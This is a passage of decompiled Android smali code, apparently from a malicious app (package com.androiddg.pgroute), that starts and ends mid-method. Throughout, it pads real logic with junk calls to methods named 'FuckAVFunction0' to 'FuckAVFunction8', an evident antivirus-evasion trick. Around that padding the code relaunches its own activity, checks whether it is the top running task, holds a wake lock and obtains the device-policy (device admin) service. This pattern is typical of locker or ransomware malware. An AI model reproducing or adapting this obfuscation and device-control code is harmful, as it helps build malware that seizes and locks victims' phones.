    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 356
    const-string v0, "aRmHuDNP"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2ff7fbcc

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "rrvAUIdKSnI"

    const-string v4, "HVwNmu"

    const v5, 0x1d5bd9c0

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 357
    new-instance v7, Landroid/content/Intent;

    invoke-direct {v7}, Landroid/content/Intent;-><init>()V

    .line 358
    .local v7, "intent":Landroid/content/Intent;
    const-string v0, "GphlpE"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "jpdhpS"

    const-string v3, "ioFLqeu"

    const v4, 0x2ce75a27

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x1f3a1478

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 359
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "BkaPRks"

    const-string v2, "lOCQSAK"

    const-string v3, "Rwqkimc"

    const-string v4, "fWKfrCSb"

    const-string v5, "PkFDaNa"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 360
    const-class v0, Lcom/androiddg/pgroute/EhMUGOnM;

    invoke-virtual {v7, p0, v0}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 361
    const-string v0, "iRLFoNP"

    const-string v1, "nAlQKEM"

    const-string v2, "HFHuVimg"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 362
    const-string v0, "tWjUtC"

    const-string v1, "gTPkTeiBD"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 363
    invoke-virtual {v7}, Landroid/content/Intent;->getFlags()I

    move-result v0

    const/high16 v1, 0x10000000

    or-int/2addr v0, v1

    invoke-virtual {v7, v0}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 364
    const-string v0, "gaBuVNoi"

    const-string v1, "UtItO"

    const v2, 0x3ad128e4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "Svppb"

    const-string v4, "eTwoLmc"

    const-string v5, "UllSOhn"

    const-string v6, "FaPNDqNk"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 365
    invoke-virtual {p0, v7}, Lcom/androiddg/pgroute/oRwHoDwR;->startActivity(Landroid/content/Intent;)V

    .line 366
    const-string v0, "nAQfnCO"

    const-string v1, "cBkVeui"

    const v2, 0x28489596

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "BkHDmuR"

    const-string v4, "KplIhMf"

    const-string v5, "seFmo"

    const-string v6, "tUMMft"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 367
    return-void
.end method


# virtual methods
.method public isRunning()Z
    .locals 12

    .prologue
    const/4 v11, 0x0

    const/4 v10, 0x1

    .line 370
    const-string v0, "nEMUj"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "AftdAfQjb"

    const-string v3, "swwqTuRP"

    const v4, 0x209c71d4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x34e9a368

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 371
    const-string v0, "hjdCnGGj"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1a7df9ca

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x2d4f318f

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "jESKInC"

    const v5, 0x19f49b67

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "WjWjrUOG"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 372
    const-string v0, "activity"

    invoke-virtual {p0, v0}, Lcom/androiddg/pgroute/oRwHoDwR;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/app/ActivityManager;

    .line 373
    .local v7, "am":Landroid/app/ActivityManager;
    const-string v0, "HBgcRgDc"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "DwoTsuu"

    const-string v3, "MtpQdb"

    const v4, 0xf1f27f9

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x2d83d013

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 374
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "CdUdvMjh"

    const-string v2, "cJukkBH"

    const-string v3, "WIjGOjC"

    const-string v4, "eHPHDFJP"

    const-string v5, "KEMAfUQ"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 375
    const-string v0, "cseHsgHuLJ"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "iaHeeNm"

    const-string v3, "lGnnUId"

    const v4, 0x2597e0cf

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x4959b76

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 376
    invoke-virtual {v7, v10}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v8

    .line 377
    .local v8, "tasks":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    const v0, 0x3210e2bc

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "BDsHmocskmsg"

    const-string v2, "djAvCA"

    const-string v3, "HcFeTNms"

    const-string v4, "lOUjEfGCG"

    const-string v5, "JmDwsic"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 378
    const-string v0, "AnQbGdjG"

    const-string v1, "TDaVoeqePk"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 379
    invoke-interface {v8}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    .line 380
    const-string v0, "fvUWnpK"

    const-string v1, "qNugDR"

    const v2, 0xdafc0c8

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "NPwRes"

    const-string v4, "CCMhjMb"

    const-string v5, "HHLsR"

    const-string v6, "dvdKpOUrv"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 381
    const-string v0, "LkRPLs"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1e64cf29

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x47dd1b

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "caqNkHw"

    const v5, 0x1fccc305    # 8.6719993E-20f

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "BTRJkJ"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 382
    invoke-interface {v8, v11}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v9, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 383
    .local v9, "topActivity":Landroid/content/ComponentName;
    const-string v0, "bnfMrSr"

    const-string v1, "usaJPg"

    const-string v2, "vCUpfbbU"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 384
    const-string v0, "FgamPk"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x31f834b5

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "AUhIdS"

    const-string v4, "oHLFLoL"

    const v5, 0x2da9ff23

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 385
    const-string v0, "cNLPNJVg"

    const-string v1, "SnUEQr"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 386
    invoke-virtual {v9}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Lcom/androiddg/pgroute/oRwHoDwR;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 387
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "OEfSQj"

    const-string v2, "mssoTuVw"

    const-string v3, "pdQjfI"

    const-string v4, "aeFDPJB"

    const-string v5, "GIQUd"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 388
    const v0, 0x68ece1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "nvpbAhp"

    const-string v2, "msasqqN"

    const-string v3, "StjpMGOh"

    const-string v4, "VLRRakuNw"

    const-string v5, "lnvrtUjn"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move v0, v10

    .line 392
    .end local v9    # "topActivity":Landroid/content/ComponentName;
    :goto_0
    return v0

    :cond_0
    move v0, v11

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 6
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 430
    const-string v0, "SEnjtjQ"

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "ptMOSQ"

    const-string v3, "iDDLDugi"

    const v4, 0x17674a71

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x176f34fa

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 432
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 14

    .prologue
    const-wide/16 v12, 0x0

    const/4 v11, 0x0

    const/4 v10, 0x1

    .line 186
    const-string v0, "HHPHikmNe"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "RDoiTTLL"

    const-string v3, "KWACMO"

    const v4, 0x1d87281b

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x156357de    # 4.59116E-26f

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 188
    sput-boolean v10, Lcom/androiddg/pgroute/oRwHoDwR;->isRunning:Z

    .line 189
    const-string v0, "weHqFFkoR"

    const-string v1, "UUddOlGQCO"

    const-string v2, "FmFHDa"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 190
    const-string v0, "tGChnb"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x33eea63e

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x2136d5

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "Mlvdtj"

    const v5, 0x3234bdc2

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "nQhGOnr"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 191
    const v0, 0x31f1afcb

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "QIdrbljp"

    const-string v2, "RLseguu"

    const-string v3, "fCjlUIOU"

    const-string v4, "PTiJVcDTBe"

    const-string v5, "KOtKApSh"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 192
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/androiddg/pgroute/oRwHoDwR;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/os/PowerManager;

    .line 193
    .local v8, "mgr":Landroid/os/PowerManager;
    const-string v0, "KhOAhpA"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x232df3aa

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x151c0ed

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "EbhhAEn"

    const v5, 0x230ce3e4

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "IOGSplMt"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 194
    const v0, 0x313c14a2

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "AUrhOKb"

    const-string v2, "soqJe"

    const-string v3, "QbjUIS"

    const-string v4, "PqBeqJR"

    const-string v5, "CUCUUpbr"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 195
    const-string v0, "WakeLock"

    invoke-virtual {v8, v10, v0}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 196
    const-string v0, "hnSfCMCC"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "GIbOQC"

    const-string v3, "RJaPVeguc"

    const v4, 0x27047cc0

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x310079ff

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 197
    const-string v0, "pGQpUKvU"

    const-string v1, "TBJigwJ"

    const v2, 0x1443fe4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "oqePaLg"

    const-string v4, "EChOOnfh"

    const-string v5, "LuccsJ"

    const-string v6, "MGKUQE"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 198
    const-string v0, "ciHHHg"

    const-string v1, "AUMUGjbQp"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 199
    const-string v0, "vQhpp"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x35fcd765

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "RoLVBcJ"

    const-string v4, "bWdGUdQ"

    const v5, 0x218ffbaa

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 200
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 201
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "WAApKdIbG"

    const-string v2, "JucgRRL"

    const-string v3, "SKIIU"

    const-string v4, "HqoBie"

    const-string v5, "jvtrlCGlfj"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 202
    const-string v0, "HDgJT"

    const-string v1, "IQbpCISf"

    const-string v2, "HFeFRqk"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 203
    iput-object p0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->context:Landroid/content/Context;

    .line 204
    const-string v0, "EEOMfnpSM"

    const-string v1, "gLgokJq"

    const-string v2, "vbvndrpE"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction2(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 205
    const-string v0, "esJiosR"

    const-string v1, "GCvtO"

    const v2, 0x26c59fa8

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "dKAnhKn"

    const-string v4, "RiLPBL"

    const-string v5, "Qpfvfd"

    const-string v6, "RHigFL"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction1(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 206
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "PNmFLaNeuwDo"

    const-string v2, "ntlhCSv"

    const-string v3, "BNVkmkF"

    const-string v4, "CrdlAKjr"

    const-string v5, "uJFwReN"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction0(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 207
    const-string v0, "fctewaqlcem"

    invoke-virtual {p0, v0, v11}, Lcom/androiddg/pgroute/oRwHoDwR;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->settings:Landroid/content/SharedPreferences;

    .line 208
    const-string v0, "MpjOAvlMOr"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x18c1bd44

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0xe7c2d23

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "EWfOMS"

    const v5, 0x20d6a6d8

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "dEIdAGlj"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 209
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lcom/androiddg/pgroute/oRwHoDwR;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    .line 210
    const-string v0, "PsJHTsRDe"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2f9804c

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "tdSSI"

    const-string v4, "cwciH"

    const v5, 0x26ee22c3

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 211
    const-string v0, "TJJFqmL"

    const-string v1, "KhflCCp"

    const-string v2, "TuVuckg"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "awmiJ"

    const v5, 0x798bc12

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 212
    const-string v0, "TBJsaVF"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x7526ba6

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2
